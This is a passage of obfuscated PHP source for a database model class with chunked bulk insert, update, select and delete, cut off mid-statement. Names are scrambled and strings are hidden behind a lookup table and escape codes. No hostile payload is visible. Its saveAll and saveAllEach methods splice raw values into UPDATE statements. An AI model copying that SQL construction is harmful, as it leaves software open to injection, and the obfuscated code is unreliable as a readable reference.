$BĞĞä‘÷ßÃ = array($FÊ‹¿îœê™ => $fˆÔèö¨Ç, $fÀäË‡Ø‹[371] => $BÓŠõÖÅ ˜); goto dÈÀ”Û‰ëÊ; Eê»ç¼„¾: $fÀäË‡Ø‹ =& $_SERVER[œº]; if (!$this->tableMeta || !$fˆÔèö¨Ç) { return !1; } $FÊ‹¿îœê™ = $this->tableMeta[$fÀäË‡Ø‹[369]]; goto f»„í³øƒ; C Ÿ³½ÓÖ–: CacheLock::unlock($cº‰šÉòÌì); return !0; goto e‚¿ÔÎÛ; dÈÀ”Û‰ëÊ: if (is_null($BÓŠõÖÅ ˜)) { return $A Š§Ö¤Ãé->where(array($FÊ‹¿îœê™ => $fˆÔèö¨Ç))->delete(); } if (is_null($f’×Ú…Æ÷) && is_string($BÓŠõÖÅ ˜)) { return $A Š§Ö¤Ãé->where($BĞĞä‘÷ßÃ)->delete(); } $AÆ–Ûó–²¡ = is_array($BÓŠõÖÅ ˜) ? $BÓŠõÖÅ ˜ : array(); goto d’ô‚¥®†; e‚¿ÔÎÛ: } public function metaGet($Eİö‚Æƒ¾Ë, $B„¼•Ñº…× = false) { goto dºÄÀ­…Ë; dºÄÀ­…Ë: $C›âÖÓ¥î‰ =& $_SERVER[œº]; if (!$this->tableMeta) { return array(); } $bó…æ…Ş­Æ = $this->tableMeta[$C›âÖÓ¥î‰[369]]; goto E¶çŒóï½­; E¶çŒóï½­: $eº¦Ò¾´á = Model($this->tableMeta[$C›âÖÓ¥î‰[370]]); if ($B„¼•Ñº…×) { $cãÑ¢îéš = array($bó…æ…Ş­Æ => $Eİö‚Æƒ¾Ë, $C›âÖÓ¥î‰[93] => $B„¼•Ñº…×); return $eº¦Ò¾´á->where($cãÑ¢îéš)->getField($C›âÖÓ¥î‰[372]); } $cãÑ¢îéš = array($bó…æ…Ş­Æ => $Eİö‚Æƒ¾Ë); goto e›˜ïŞ»ä; e›˜ïŞ»ä: $dÏÜ‰İÒÔ = $eº¦Ò¾´á->field($C›âÖÓ¥î‰[374])->where($cãÑ¢îéš)->select(); $dÏÜ‰İÒÔ = array_to_keyvalue($dÏÜ‰İÒÔ, $C›âÖÓ¥î‰[93], $C›âÖÓ¥î‰[372]); return $dÏÜ‰İÒÔ; goto f„Ä¦Õ«¸¸; f„Ä¦Õ«¸¸: } private function checkDataAutoHas($b³÷¯À“à) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $d®ÒÉ­“ÇÈ) { if (in_array($b³÷¯À“à, explode($_SERVER[œº][47], $d®ÒÉ­“ÇÈ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$E¥§—Úï÷, $dŒÓ¡ÕÁ²) { $aùà–ÇÄİÚ =& $_SERVER[œº]; foreach ($this->dataAuto as $eŞŞ¨©×Ã) { $fÌÖø§æƒ¯ = $eŞŞ¨©×Ã[0]; if (!in_array($dŒÓ¡ÕÁ², explode($aùà–ÇÄİÚ[47], $eŞŞ¨©×Ã[2]))) { continue; } switch (trim($eŞŞ¨©×Ã[3])) { case $aùà–ÇÄİÚ[319]: case $aùà–ÇÄİÚ[320]: $f …·‰¼ÕÓ = $eŞŞ¨©×Ã[1]; $B„Ú³Ï¢•ô = isset($eŞŞ¨©×Ã[4]) ? (array) $eŞŞ¨©×Ã[4] : array(); if ($f …·‰¼ÕÓ == $aùà–ÇÄİÚ[197] && array_key_exists($fÌÖø§æƒ¯, $E¥§—Úï÷)) { if (!$E¥§—Úï÷[$fÌÖø§æƒ¯]) { unset($E¥§—Úï÷[$fÌÖø§æƒ¯]); } break; } if (isset($E¥§—Úï÷[$fÌÖø§æƒ¯])) { array_unshift($B„Ú³Ï¢•ô, $E¥§—Úï÷[$fÌÖø§æƒ¯]); } if ($aùà–ÇÄİÚ[319] == $eŞŞ¨©×Ã[3]) { $E¥§—Úï÷[$fÌÖø§æƒ¯] = call_user_func_array($f …·‰¼ÕÓ, $B„Ú³Ï¢•ô); } else { $E¥§—Úï÷[$fÌÖø§æƒ¯] = call_user_func_array(array(&$this, $f …·‰¼ÕÓ), $B„Ú³Ï¢•ô); } break; case $aùà–ÇÄİÚ[271]: $E¥§—Úï÷[$fÌÖø§æƒ¯] = $E¥§—Úï÷[$eŞŞ¨©×Ã[1]]; break; case $aùà–ÇÄİÚ[292]: if (isset($E¥§—Úï÷[$fÌÖø§æƒ¯]) && !is_string($E¥§—Úï÷[$fÌÖø§æƒ¯])) { $E¥§—Úï÷[$fÌÖø§æƒ¯] = json_encode_force($E¥§—Úï÷[$fÌÖø§æƒ¯]); } break; case $aùà–ÇÄİÚ[321]: if ($E¥§—Úï÷[$fÌÖø§æƒ¯] === $aùà–ÇÄİÚ[33]) { unset($E¥§—Úï÷[$fÌÖø§æƒ¯]); } break; case $aùà–ÇÄİÚ[322]: $E¥§—Úï÷[$fÌÖø§æƒ¯] = $eŞŞ¨©×Ã[1]; default: break; } } if ($dŒÓ¡ÕÁ² == $aùà–ÇÄİÚ[355]) { $EªÓ¦Ü„­³ = strtolower($this->db->getDbType()); if (strpos($EªÓ¦Ü„­³, $aùà–ÇÄİÚ[9]) !== 0) { return; } $bÎä•Ç„ìÑ = $this->field(!0)->fields; $Cé±¦øçó = $bÎä•Ç„ìÑ[$aùà–ÇÄİÚ[250]]; if (isset($bÎä•Ç„ìÑ[$aùà–ÇÄİÚ[249]])) { unset($Cé±¦øçó[$bÎä•Ç„ìÑ[$aùà–ÇÄİÚ[249]]]); } foreach ($Cé±¦øçó as $C¤›¦å‚ ‚ => $dŒÓ¡ÕÁ²) { if (!isset($E¥§—Úï÷[$C¤›¦å‚ ‚])) { $E¥§—Úï÷[$C¤›¦å‚ ‚] = $aùà–ÇÄİÚ[33]; } } } } private function dataAfterFilter(&$Dİ®ÒãÈ) { $dÅ“‹Ñ±ÈÏ =& $_SERVER[œº]; foreach ($this->dataAuto as $b±”ÜòÆ¨) { $E‡©Ò¤ÓÏ› = $b±”ÜòÆ¨[0]; if (!in_array($dÅ“‹Ñ±ÈÏ[357], explode($dÅ“‹Ñ±ÈÏ[47], $b±”ÜòÆ¨[2]))) { continue; } if (!isset($Dİ®ÒãÈ[$E‡©Ò¤ÓÏ›])) { continue; } switch (trim($b±”ÜòÆ¨[3])) { case $dÅ“‹Ñ±ÈÏ[319]: case $dÅ“‹Ñ±ÈÏ[320]: $fƒßâô›¥ó = isset($b±”ÜòÆ¨[4]) ? (array) $b±”ÜòÆ¨[4] : array(); array_unshift($fƒßâô›¥ó, $Dİ®ÒãÈ[$E‡©Ò¤ÓÏ›]); if ($dÅ“‹Ñ±ÈÏ[319] == $b±”ÜòÆ¨[3]) { $Dİ®ÒãÈ[$E‡©Ò¤ÓÏ›] = call_user_func_array($b±”ÜòÆ¨[1], $fƒßâô›¥ó); } else { $Dİ®ÒãÈ[$E‡©Ò¤ÓÏ›] = call_user_func_array(array(&$this, $b±”ÜòÆ¨[1]), $fƒßâô›¥ó); } break; case $dÅ“‹Ñ±ÈÏ[271]: $Dİ®ÒãÈ[$E‡©Ò¤ÓÏ›] = $Dİ®ÒãÈ[$b±”ÜòÆ¨[1]]; break; case $dÅ“‹Ñ±ÈÏ[292]: $DíÍòß = $Dİ®ÒãÈ[$E‡©Ò¤ÓÏ›]; $Dİ®ÒãÈ[$E‡©Ò¤ÓÏ›] = json_decode($DíÍòß, !0); if (is_null($Dİ®ÒãÈ[$E‡©Ò¤ÓÏ›])) { $Dİ®ÒãÈ[$E‡©Ò¤ÓÏ›] = $DíÍòß; } break; case $dÅ“‹Ñ±ÈÏ[321]: if ($Dİ®ÒãÈ[$E‡©Ò¤ÓÏ›] === $dÅ“‹Ñ±ÈÏ[33]) { unset($Dİ®ÒãÈ[$E‡©Ò¤ÓÏ›]); } break; case $dÅ“‹Ñ±ÈÏ[322]: $Dİ®ÒãÈ[$E‡©Ò¤ÓÏ›] = $b±”ÜòÆ¨[1]; default: break; } } } public function saveAll($fòŒóŒƒ‘) { goto AŞˆ‘à’ƒ; D†¾Â”»…¯: $this->chunkEventSet(); goto fîëé³ˆùŠ; AŞˆ‘à’ƒ: $fà…ÍÚ£²“ =& $_SERVER[œº]; $aÑÊÁ±ëö = $this->tablePrefix . $this->tableName; $Cñ¦ãÑÊ‘¦ = self::SQL_WHERE_IN_CHUNK; goto dñ¹ÉÆí‡ç; dñ¹ÉÆí‡ç: $fòŒóŒƒ‘ = is_array($fòŒóŒƒ‘) ? $fòŒóŒƒ‘ : array(); $a¡ÎŒ˜Ì„Á = $fà…ÍÚ£²“[375]; $dîÕÉšù†å = 0; goto c¨Ó£®Œš; c¨Ó£®Œš: $eç®êÇâÂ» = array(); $D¶®£àôŸÚ = count($fòŒóŒƒ‘); for ($C³¦¶Õ‘îÅ = 0; $C³¦¶Õ‘îÅ < $D¶®£àôŸÚ; $C³¦¶Õ‘îÅ++) { $eèºŸ¸ÅñÍ = $fòŒóŒƒ‘[$C³¦¶Õ‘îÅ]; if (!is_array($eèºŸ¸ÅñÍ) || count($eèºŸ¸ÅñÍ) != 4) { continue; } $aœÑÕ’ø‹ = "\x55\120\x44\101\x54\x45\40\x60{$aÑÊÁ±ëö}\x60\x20\123\x45\x54\x20{$eèºŸ¸ÅñÍ[2]}\40\x3d\x20\103\x41\123\x45\x20{$eèºŸ¸ÅñÍ[0]}\x20\12"; if ($dîÕÉšù†å == 0) { $a¡ÎŒ˜Ì„Á = $aœÑÕ’ø‹; } $eç®êÇâÂ»[] = $fà…ÍÚ£²“[116] . $eèºŸ¸ÅñÍ[1] . $fà…ÍÚ£²“[116]; $dîÕÉšù†å++; $a¡ÎŒ˜Ì„Á .= "\x20\x57\110\105\x4e\40\47{$eèºŸ¸ÅñÍ[1]}\47\x20\124\x48\105\x4e\40\x27{$eèºŸ¸ÅñÍ[3]}\47\40\12"; if ($dîÕÉšù†å == $Cñ¦ãÑÊ‘¦ || $C³¦¶Õ‘îÅ == $D¶®£àôŸÚ - 1) { goto aºÎšô¯; aºÎšô¯: $a²•£øé Ø = implode($fà…ÍÚ£²“[47], $eç®êÇâÂ»); $a¡ÎŒ˜Ì„Á .= "\x20\x45\x4e\104\x20\40\x57\110\105\x52\105\x20{$eèºŸ¸ÅñÍ[0]}\x20\x49\x4e\x20\x28{$a²•£øé Ø}\51\40"; $this->execute($a¡ÎŒ˜Ì„Á); goto FÊØÖ½˜¿£; cë·»Óƒ·¦: $eç®êÇâÂ» = array(); goto e²¡Íø†„Ş; FÊØÖ½˜¿£: $dîÕÉšù†å = 0; $a¡ÎŒ˜Ì„Á = $aœÑÕ’ø‹; $this->chunkEventCheck(count($eç®êÇâÂ»)); goto cë·»Óƒ·¦; e²¡Íø†„Ş: } } goto D†¾Â”»…¯; fîëé³ˆùŠ: } public function saveAllEach($cº‚ÂÁ‚ì®) { $AíÊë„²–— =& $_SERVER[œº]; $fˆ²·ö££• = $this->tablePrefix . $this->tableName; foreach ($cº‚ÂÁ‚ì® as $Fãƒ ÷ôº) { if (!is_array($Fãƒ ÷ôº) || count($Fãƒ ÷ôº) != 4) { continue; } $a¹¾†„†¸² = $Fãƒ ÷ôº[0] . $AíÊë„²–—[376] . $Fãƒ ÷ôº[1] . $AíÊë„²–—[116]; $f¼‰½Ææ = $Fãƒ ÷ôº[2] . $AíÊë„²–—[376] . $Fãƒ ÷ôº[3] . $AíÊë„²–—[116]; $Aãö¤ğ­èè = "\x75\160\x64\x61\x74\x65\40{$fˆ²·ö££•}\40\x73\x65\164\x20{$f¼‰½Ææ}\40\167\150\x65\162\145\x20{$a¹¾†„†¸²}\73"; $this->execute($Aãö¤ğ­èè); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($cöÊÆÉ¨ì = false, $f™ó¤Ô”é = false) { $this->_chunkEvent = $cöÊÆÉ¨ì; $this->_chunkEventParam = $f™ó¤Ô”é; } private function chunkEventCheck($d†Éì›‘Âƒ) { if (!$this->_chunkEvent) { return; } $FÍÃ…³£È× = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $FÍÃ…³£È×[$_SERVER[œº][377]] = $d†Éì›‘Âƒ; Hook::trigger($this->_chunkEvent, $FÍÃ…³£È×); } public function addAll($C§‡ÁÌÜÑë, $aË‰íï•Ò = array(), $DÔÁÚÅ×¥¬ = false) { goto CˆÈ¿¬—„; CˆÈ¿¬—„: $EãíËêÈ¢Ã =& $_SERVER[œº]; ignore_timeout(); $b¯±‹„¹“ = self::SQL_WHERE_IN_CHUNK; goto cß™›íÒ§; CÕå‘¤ÈŒï: if (method_exists($this->db, $EãíËêÈ¢Ã[270])) { for ($aºà¾ó˜â = 0; $aºà¾ó˜â < count($C§‡ÁÌÜÑë); $aºà¾ó˜â += $b¯±‹„¹“) { $dËÅ¿É—…½ = array_slice($C§‡ÁÌÜÑë, $aºà¾ó˜â, $b¯±‹„¹“); if (!is_array($dËÅ¿É—…½) || count($dËÅ¿É—…½) == 0) { break; } $E‰¸”ğ´Ú = $this->db->insertAll($dËÅ¿É—…½, $aË‰íï•Ò, $DÔÁÚÅ×¥¬); $this->chunkEventCheck(count($dËÅ¿É—…½)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($C§‡ÁÌÜÑë as $b’°‚ªâÒ· => $F³ÃĞ¸îÀ÷) { $E‰¸”ğ´Ú = $this->db->insert($F³ÃĞ¸îÀ÷, $aË‰íï•Ò, $DÔÁÚÅ×¥¬); } $this->commit(); } if (!1 !== $E‰¸”ğ´Ú) { $cœ½ƒ±¤ = $this->getLastInsID(); if ($cœ½ƒ±¤) { return $cœ½ƒ±¤; } } return $E‰¸”ğ´Ú; goto cäâÜ“‡; cß™›íÒ§: if (empty($C§‡ÁÌÜÑë)) { $this->error = think_lang($EãíËêÈ¢Ã[269]); return !1; } $aË‰íï•Ò = $this->_parseOptions($aË‰íï•Ò); foreach ($C§‡ÁÌÜÑë as $b’°‚ªâÒ· => $F³ÃĞ¸îÀ÷) { $C§‡ÁÌÜÑë[$b’°‚ªâÒ·] = $this->_facade($F³ÃĞ¸îÀ÷); $this->_beforeInsert($C§‡ÁÌÜÑë[$b’°‚ªâÒ·], $aË‰íï•Ò); } goto CÕå‘¤ÈŒï; cäâÜ“‡: } public function save($B¬‘¶Ù¢º¥ = '', $a¿¨§½¼Ê¯ = array()) { goto EçÂÍÛ½˜Ù; EçÂÍÛ½˜Ù: $C ©ñĞ“ÉÎ =& $_SERVER[œº]; $bˆ² æ½œŒ = self::SQL_WHERE_IN_CHUNK; $aÂù¸‰µ“‚ = $this->optionsValue(); goto D¹ÙÕ•ŞÇ; FÀºÚ±Ú´: $bÒÃËˆãÖœ = $aÂù¸‰µ“‚[$C ©ñĞ“ÉÎ[273]][$D¯½Ò´ ë][1]; $bÒÃËˆãÖœ = is_array($bÒÃËˆãÖœ) ? $bÒÃËˆãÖœ : array(); $a¯· âÅ¶Ô = count($bÒÃËˆãÖœ); goto BÎâĞÅó‚ñ; BÎâĞÅó‚ñ: for ($cŠˆë¢¯Õæ = 0; $cŠˆë¢¯Õæ < $a¯· âÅ¶Ô; $cŠˆë¢¯Õæ += $bˆ² æ½œŒ) { $fŞ‚²·ÑÍ = array_slice($bÒÃËˆãÖœ, $cŠˆë¢¯Õæ, $bˆ² æ½œŒ); if (!is_array($fŞ‚²·ÑÍ) || count($fŞ‚²·ÑÍ) == 0) { break; } $aÂù¸‰µ“‚[$C ©ñĞ“ÉÎ[273]][$D¯½Ò´ ë][1] = $fŞ‚²·ÑÍ; $this->optionsValue($aÂù¸‰µ“‚); $b¬î÷ÏĞøµ += parent::save($B¬‘¶Ù¢º¥, $a¿¨§½¼Ê¯); $this->chunkEventCheck(count($fŞ‚²·ÑÍ)); } $this->chunkEventSet(); return $b¬î÷ÏĞøµ; goto F—õ»½Ê; D¹ÙÕ•ŞÇ: $D¯½Ò´ ë = $this->findWhereField($aÂù¸‰µ“‚); if (!$D¯½Ò´ ë) { return parent::save($B¬‘¶Ù¢º¥, $a¿¨§½¼Ê¯); } $b¬î÷ÏĞøµ = 0; goto FÀºÚ±Ú´; F—õ»½Ê: } public function add($f»‚Ş¿ôİ = '', $Dø«º‰¢•¾ = array(), $e‰¢ñ¬óŒí = false) { if ($this->addTaskStatus && is_array($f»‚Ş¿ôİ)) { $this->addTaskData[] = $f»‚Ş¿ôİ; return; } return parent::add($f»‚Ş¿ôİ, $Dø«º‰¢•¾, $e‰¢ñ¬óŒí); } public function parseWhereLike($A…ª¥ÊÔß‹, $A©œè³¿æ¬ = '', $c¨’Ñ³‚„Î = false, &$B‚ºÀ§¯ù = false) { goto dÇŠƒ“†«; dÇŠƒ“†«: $F´¥Úœñ´› =& $_SERVER[œº]; $dÆœÎ£ë¡š = $GLOBALS[$F´¥Úœñ´›[6]][$F´¥Úœñ´›[378]]; if (!$dÆœÎ£ë¡š[$F´¥Úœñ´›[379]]) { return $A…ª¥ÊÔß‹; } goto aŒ¢ƒ„ïÅé; aŒ¢ƒ„ïÅé: if (!is_array($A…ª¥ÊÔß‹)) { return $A…ª¥ÊÔß‹; } $Dµ¹‚’ˆïÂ = array(); $a‹•˜‹ˆíÅ = 0; goto C±çŒ˜·”Š; C±çŒ˜·”Š: foreach ($A…ª¥ÊÔß‹ as $f‚öèÖáŞë => $B°¸ÒãËğ„) { if (is_array($B°¸ÒãËğ„) && count($B°¸ÒãËğ„) == 2 && $B°¸ÒãËğ„[0] == $F´¥Úœñ´›[380] && is_string($B°¸ÒãËğ„[1]) && substr($B°¸ÒãËğ„[1], 0, 1) == $F´¥Úœñ´›[381] && substr($B°¸ÒãËğ„[1], strlen($B°¸ÒãËğ„[1]) - 1, 1) == $F´¥Úœñ´›[381]) { goto aÍì—¡ÆÅ×; eöÏòòõ×…: if ($dÆœÎ£ë¡š[$F´¥Úœñ´›[383]]) { $fŞŸªí¾•¯ = $F´¥Úœñ´›[384] . $aƒíô°‚­… . $F´¥Úœñ´›[385]; if ($dÆœÎ£ë¡š[$F´¥Úœñ´›[386]]) { $fŞŸªí¾•¯ = $F´¥Úœñ´›[385] . $aƒíô°‚­… . $F´¥Úœñ´›[384]; } } $Dµ¹‚’ˆïÂ[$a‹•˜‹ˆíÅ] = $F´¥Úœñ´›[387] . $DòÕ—È¶¬­ . $F´¥Úœñ´›[388] . $fŞŸªí¾•¯ . $F´¥Úœñ´›[389]; $a‹•˜‹ˆíÅ++; goto D¿«§µ ³–; D¿«§µ ³–: continue; goto cÊÉÌ¼‘à; CÑ¢®¥È•: $aƒíô°‚­… = $this->db->escapeString($aƒíô°‚­…); if (!strpos($DòÕ—È¶¬­, $F´¥Úœñ´›[95])) { $DòÕ—È¶¬­ = $F´¥Úœñ´›[382] . $DòÕ—È¶¬­ . $F´¥Úœñ´›[382]; } $fŞŸªí¾•¯ = $F´¥Úœñ´›[182] . $aƒíô°‚­… . $F´¥Úœñ´›[182]; goto eöÏòòõ×…; aÍì—¡ÆÅ×: $B‚ºÀ§¯ù = !0; $DòÕ—È¶¬­ = is_string($f‚öèÖáŞë) ? $f‚öèÖáŞë : $A©œè³¿æ¬; $aƒíô°‚­… = substr($B°¸ÒãËğ„[1], 1, strlen($B°¸ÒãËğ„[1]) - 2); goto CÑ¢®¥È•; cÊÉÌ¼‘à: } if (is_array($B°¸ÒãËğ„)) { $A©œè³¿æ¬ = is_string($f‚öèÖáŞë) ? $f‚öèÖáŞë : $A©œè³¿æ¬; $B°¸ÒãËğ„ = $this->parseWhereLike($B°¸ÒãËğ„, $A©œè³¿æ¬, !0, $B‚ºÀ§¯ù); } if (is_numeric($f‚öèÖáŞë)) { $Dµ¹‚’ˆïÂ[$a‹•˜‹ˆíÅ] = $B°¸ÒãËğ„; $a‹•˜‹ˆíÅ++; } else { $Dµ¹‚’ˆïÂ[$f‚öèÖáŞë] = $B°¸ÒãËğ„; } } if ($B‚ºÀ§¯ù && !$c¨’Ñ³‚„Î) { } return $Dµ¹‚’ˆïÂ; goto e¶§Û†È¸; e¶§Û†È¸: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($E‘½Ô‡âíÚ = array()) { goto dßãä„ï¶; b‡ãÆÅÌ•È: $dÎÇ§¯ä„Š = is_array($dÎÇ§¯ä„Š) ? $dÎÇ§¯ä„Š : array(); $CŒ£Áæë‹ = null; for ($dĞ´—øâ÷ = 0; $dĞ´—øâ÷ < count($dÎÇ§¯ä„Š); $dĞ´—øâ÷ += $c¿ã±±˜¦Ï) { $Dº‘×î¡Ÿ¢ = array_slice($dÎÇ§¯ä„Š, $dĞ´—øâ÷, $c¿ã±±˜¦Ï); if (!is_array($Dº‘×î¡Ÿ¢) || count($Dº‘×î¡Ÿ¢) == 0) { break; } $e¨’ªš˜Ÿµ[$DÜ½Şõ¾åã[273]][$CªŞÁñ»Ü][1] = $Dº‘×î¡Ÿ¢; $this->optionsValue($e¨’ªš˜Ÿµ); $aÁ¢‹Ø¥›à = parent::select($E‘½Ô‡âíÚ); if (!$aÁ¢‹Ø¥›à) { continue; } $CŒ£Áæë‹ = is_array($CŒ£Áæë‹) ? $CŒ£Áæë‹ : array(); $CŒ£Áæë‹ = array_merge($CŒ£Áæë‹, $aÁ¢‹Ø¥›à); } goto bùÈøÜ§Ë¸; bùÈøÜ§Ë¸: return $CŒ£Áæë‹; goto AŸÜº¹¡ø; dÛ·¦‘î„ˆ: $CªŞÁñ»Ü = $this->findWhereField($e¨’ªš˜Ÿµ); if (!$CªŞÁñ»Ü || isset($e¨’ªš˜Ÿµ[$DÜ½Şõ¾åã[290]]) || isset($e¨’ªš˜Ÿµ[$DÜ½Şõ¾åã[351]])) { return parent::select($E‘½Ô‡âíÚ); } $dÎÇ§¯ä„Š = $e¨’ªš˜Ÿµ[$DÜ½Şõ¾åã[273]][$CªŞÁñ»Ü][1]; goto b‡ãÆÅÌ•È; dßãä„ï¶: $DÜ½Şõ¾åã =& $_SERVER[œº]; $c¿ã±±˜¦Ï = self::SQL_WHERE_IN_CHUNK; $e¨’ªš˜Ÿµ = $this->optionsValue(); goto dÛ·¦‘î„ˆ; AŸÜº¹¡ø: } public function delete($F·½‰ìÍëÄ = array()) { goto F·ÓˆèÂÆ’; F·ÓˆèÂÆ’: $FÒ¸øß‡ÙÆ =& $_SERVER[œº]; $C…¤‡Ï®İß = self::SQL_WHERE_IN_CHUNK; $cã®ÕóêŠ = $this->optionsValue(); goto fÙ÷–À±ÄÔ; Dµ±¤õ˜°‡: $fÓ´Ì´ˆ–˜ = $cã®ÕóêŠ[$FÒ¸øß‡ÙÆ[273]][$EöÇ®²²ù«][1]; $fÓ´Ì´ˆ–˜ = is_array($fÓ´Ì´ˆ–˜) ? $fÓ´Ì´ˆ–˜ : array(); for ($C†ÇäÇ•… = 0; $C†ÇäÇ•… < count($fÓ´Ì´ˆ–˜); $C†ÇäÇ•… += $C…¤‡Ï®İß) { $Aâ«˜æÇ = array_slice($fÓ´Ì´ˆ–˜, $C†ÇäÇ•…, $C…¤‡Ï®İß); if (!is_array($Aâ«˜æÇ) || count($Aâ«˜æÇ) == 0) { break; } $cã®ÕóêŠ[$FÒ¸øß‡ÙÆ[273]][$EöÇ®²²ù«][1] = $Aâ«˜æÇ; $this->optionsValue($cã®ÕóêŠ); $e‡™òÃšªŒ += parent::delete($F·½‰ìÍëÄ); } goto C…È òˆ½ï; fÙ÷–À±ÄÔ: $EöÇ®²²ù« = $this->findWhereField($cã®ÕóêŠ); if (!$EöÇ®²²ù«) { return parent::delete($F·½‰ìÍëÄ); } $e‡™òÃšªŒ = 0; goto Dµ±¤õ˜°‡; C…È òˆ½ï: return $e‡™òÃšªŒ; goto fÛõÈ¥½; fÛõÈ¥½: } private function findWhereField($c¿ÇÙ‘ŒàŠ) { $FÇœèÌ‰ÒÔ =& $_SERVER[œº]; $AÆéÑç–¼Š = self::SQL_WHERE_IN_CHUNK; if (!is_array($c¿ÇÙ‘ŒàŠ) || !is_array($c¿ÇÙ‘ŒàŠ[$FÇœèÌ‰ÒÔ[273]])) { return !1; } foreach ($c¿ÇÙ‘ŒàŠ[$FÇœèÌ‰ÒÔ[273]] as $AáˆĞÊòä => $Aæ®§ëÈ›‡) { if (is_array($Aæ®§ëÈ›‡) && isset($Aæ®§ëÈ›‡[0]) && is_string($Aæ®§ëÈ›‡[0]) && strtolower($Aæ®§ëÈ›‡[0]) == $FÇœèÌ‰ÒÔ[7] && is_array($Aæ®§ëÈ›‡[1]) && count($Aæ®§ëÈ›‡[1]) > $AÆéÑç–¼Š) { ignore_timeout(); return $AáˆĞÊòä; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\x74\x65\x6d\117\160\164\x69\x6f\x6e"; public $field = array(); public function listData($cØ²ˆêïêğ = false, $a‹“¥±µõ© = "\x6d\x6f\x64\151\146\x79\124\x69\x6d\145", $A¥¦¦‚å‡æ = false) { $eñÌ½•óÓÃ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$eñÌ½•óÓÃ) { return $cØ²ˆêïêğ ? null : array(); } if (!$cØ²ˆêïêğ) { $eñÌ½•óÓÃ = array_filter(array_values($eñÌ½•óÓÃ)); return array_sort_by($eñÌ½•óÓÃ, $a‹“¥±µõ©, $A¥¦¦‚å‡æ); } return $eñÌ½•óÓÃ[$_SERVER[œº][390] . $cØ²ˆêïêğ]; } public function insert($EÁãŒ¦òîÁ) { goto c”ø‰³°Œ†; d½íó‰—£Ì: $EÁãŒ¦òîÁ[$E¾˜«Š«[84]] = time(); Model($this->modelType)->set($E¾˜«Š«[391], $d‡ ÁåªâÇ, $this->optionType . $E¾˜«Š«[392]); Model($this->modelType)->set($E¾˜«Š«[390] . $d‡ ÁåªâÇ, $EÁãŒ¦òîÁ, $this->optionType); goto dÅå¸Œ­¸ã; bŒ»®Ñ…çê: $d‡ ÁåªâÇ = $d‡ ÁåªâÇ ? $d‡ ÁåªâÇ : 0; $EÁãŒ¦òîÁ[$E¾˜«Š«[393]] = ++$d‡ ÁåªâÇ; $EÁãŒ¦òîÁ[$E¾˜«Š«[194]] = time(); goto d½íó‰—£Ì; c”ø‰³°Œ†: $E¾˜«Š« =& $_SERVER[œº]; $EÁãŒ¦òîÁ = array_field_key($EÁãŒ¦òîÁ, $this->field); $d‡ ÁåªâÇ = Model($this->modelType)->get($E¾˜«Š«[391], $this->optionType . $E¾˜«Š«[392]); goto bŒ»®Ñ…çê; dÅå¸Œ­¸ã: return $d‡ ÁåªâÇ; goto e‡ƒçê­Êµ; e‡ƒçê­Êµ: } public function update($eÀÂ¢î‘æ, $dØÖªïˆ¦Ö) { goto cŠçÑÎ¨Ä“; Fé…ù·ÜÉæ: if (!$ağ½¶ƒÔÏŒ) { return !1; } $dØÖªïˆ¦Ö = array_merge($ağ½¶ƒÔÏŒ, $dØÖªïˆ¦Ö); $dØÖªïˆ¦Ö[$eõ¿¼Ÿ«’[84]] = time(); goto CĞâß¡µ‚ç; cŠçÑÎ¨Ä“: $eõ¿¼Ÿ«’ =& $_SERVER[œº]; $dØÖªïˆ¦Ö = array_field_key($dØÖªïˆ¦Ö, $this->field); $ağ½¶ƒÔÏŒ = $this->listData($eÀÂ¢î‘æ); goto Fé…ù·ÜÉæ; CĞâß¡µ‚ç: return Model($this->modelType)->set($eõ¿¼Ÿ«’[390] . $eÀÂ¢î‘æ, $dØÖªïˆ¦Ö, $this->optionType); goto AÍé¶™‚ñ•; AÍé¶™‚ñ•: } public function remove($AŸ‰‹ïñ) { return Model($this->modelType)->remove($_SERVER[œº][390] . $AŸ‰‹ïñ, $this->optionType); } public function clear() { $dù‚•œ‡õ =& $_SERVER[œº]; Model($this->modelType)->remove($dù‚•œ‡õ[391], $this->optionType . $dù‚•œ‡õ[392]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($a–Ò¼±ğœ´, $déğÒ°ƒ¿Ô) { if (!$déğÒ°ƒ¿Ô) { return !1; } $eçîÈßèù = $this->listData(); $eçîÈßèù = array_to_keyvalue($eçîÈßèù, $a–Ò¼±ğœ´); return isset($eçîÈßèù[$déğÒ°ƒ¿Ô]) ? $eçîÈßèù[$déğÒ°ƒ¿Ô] : !1; } public function findByName($E¢áëğ¢) { return $this->findByKey($_SERVER[œº][28], $E¢áëğ¢); } protected function resetData($F˜¼ïšñö) { $CÕ‡åÜé¾‰ =& $_SERVER[œº]; $F˜¼ïšñö = is_array($F˜¼ïšñö) ? $F˜¼ïšñö : array(); $f¢Ùô±Îö¬ = array(); for ($EÀè°Ì‰šª = 0; $EÀè°Ì‰šª < count($F˜¼ïšñö); $EÀè°Ì‰šª++) { $f¢Ùô±Îö¬[$CÕ‡åÜé¾‰[390] . $F˜¼ïšñö[$EÀè°Ì‰šª][$CÕ‡åÜé¾‰[393]]] = $F˜¼ïšñö[$EÀè°Ì‰šª]; } return Model($this->modelType)->set($f¢Ùô±Îö¬, !1, $this->optionType); } private function getAutoName($d±Á»²ö˜ë) { $eƒÁ…ĞÌğ¢ = array_to_keyvalue($this->listData(), $_SERVER[œº][28]); if (!$eƒÁ…ĞÌğ¢ || !isset($eƒÁ…ĞÌğ¢[$d±Á»²ö˜ë])) { return $d±Á»²ö˜ë; } for ($Cğë‚ß»¶ç = 1; $Cğë‚ß»¶ç < count($eƒÁ…ĞÌğ¢); $Cğë‚ß»¶ç++) { $eÒêîìÎ–Ü = $d±Á»²ö˜ë . "\50{$Cğë‚ß»¶ç}\x29"; if 